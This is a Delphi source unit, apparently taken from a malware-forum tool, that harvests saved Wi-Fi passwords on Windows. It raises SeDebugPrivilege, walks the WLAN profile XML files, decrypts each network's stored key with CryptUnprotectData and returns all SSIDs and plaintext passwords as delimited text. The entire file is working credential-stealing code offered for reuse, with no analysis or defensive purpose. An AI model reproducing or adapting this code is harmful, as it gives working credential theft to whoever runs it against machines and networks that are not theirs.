unit UnitWifiPasswords; //Original unit from indetectables.net, unknown author -> modified by wrh1d3 :)

interface

uses
  Windows, Classes, UnitFunctions;

function ListWifiPasswords: string;

implementation

var
  Size: DWORD = 1024;

procedure FindXmlFiles(StartDir, FileMask: string; var FilesList: TStringList);
var
  sRec: TSearchRec;
  DirList: TStringList;
  IsFound: Boolean;
  i: integer;
begin
  if StartDir[length(StartDir)] <> '\' then StartDir := StartDir + '\';
  IsFound := FindFirst(StartDir + FileMask, faAnyFile - faDirectory, sRec) = 0;

  while IsFound do
  begin
    FilesList.Add(StartDir + sRec.Name);        
    IsFound := FindNext(sRec) = 0;
  end;

  FindClose(sRec);
  DirList := TStringList.Create;

  try
    IsFound := FindFirst(StartDir + '*.*', faAnyFile, sRec) = 0;
    while IsFound do
    begin
      if ((sRec.Attr and faDirectory) <> 0) and (sRec.Name[1] <> '.') then
        DirList.Add(StartDir + sRec.Name);
      IsFound := FindNext(sRec) = 0;
    end;
    FindClose(sRec);
    for i := 0 to DirList.Count - 1 do FindXmlFiles(DirList[i], FileMask, FilesList);
  finally
    DirList.Free;
  end;
end;

function CryptStringToBinaryW(pszString: PWideChar; cchString: DWORD; dwFlags: DWORD;
  pbBinary: pbyte; var pcbBinary: dword; pdwSkip: PDWORD;
  pdwFlags: PDWORD): BOOL; stdcall; external 'crypt32.dll' name 'CryptStringToBinaryW';

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PLPWSTR; pOptionalEntropy:
  PDATA_BLOB; pvReserved: Pointer; pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT; dwFlags: DWORD;
  pDataOut: PDATA_BLOB): BOOL; stdcall; external 'crypt32.dll' Name 'CryptUnprotectData';

function ListWifiPasswords: string;
var
  ByteKey: array[0..1024] of PByte;
  FilesList, Datas: TStringList;
  Src, Dst: DATA_BLOB;
  SSID, Auth, Encr, Keytype,
  ConnType, ConnMode, Protc: string;
  Password: WideString;  
  i: Integer;
begin
  SetTokenPrivileges('SeDebugPrivilege');
  
  try
    FilesList := TStringList.Create;
    FindXmlFiles(RootDir + 'ProgramData\Microsoft\Wlansvc\Profiles\', '*.xml', FilesList);

    for i := 0 to FilesList.Count - 1 do
    begin
      Datas := TStringList.Create;
      Datas.LoadFromFile(FilesList[i]);

      SSID := ParseXml('<name>', Datas.Text, '</name>'); //essid
      Auth := ParseXml('<authentication>', Datas.Text, '</authentication>');//cifrado wep o wpa
      Encr := ParseXml('<encryption>', Datas.Text, '</encryption>'); //encyption type
      Keytype := ParseXml('<keyType>', Datas.Text, '</keyType>');  //key type
      ConnType := ParseXml('<connectionType>', Datas.Text, '</connectionType>');
      ConnMode := ParseXml('<connectionMode>', Datas.Text, '</connectionMode>');
      Protc := ParseXml('<protected>', Datas.Text, '</protected>');
      Password := ParseXml('<keyMaterial>', Datas.Text, '</keyMaterial>'); //clave wireles
                                               
      ZeroMemory(@ByteKey[0], SizeOf(ByteKey));
      if CryptStringToBinaryW(PWideChar(Password), Length(Password), 4, @ByteKey[0], Size, nil, nil) then
      begin      
        Src.cbData := Size;
        Src.pbdata := @ByteKey[0];
        if CryptUnProtectData(@Src, nil, nil, nil, nil, 4, @Dst) then
          Password := PWideChar(Dst.pbData);

        Result := Result + SSID + '|';
        Result := Result + ConnType + '|';
        Result := Result + ConnMode + '|';
        Result := Result + Auth + '|';
        Result := Result + Encr + '|';
        Result := Result + Keytype + '|';
        Result := Result + Protc + '|';
        Result := Result + Password + '|' + #13#10;
      end;
      
      Datas.free;
    end;

    FilesList.Free;
  except
    Result := '';
  end; 
end;

end.
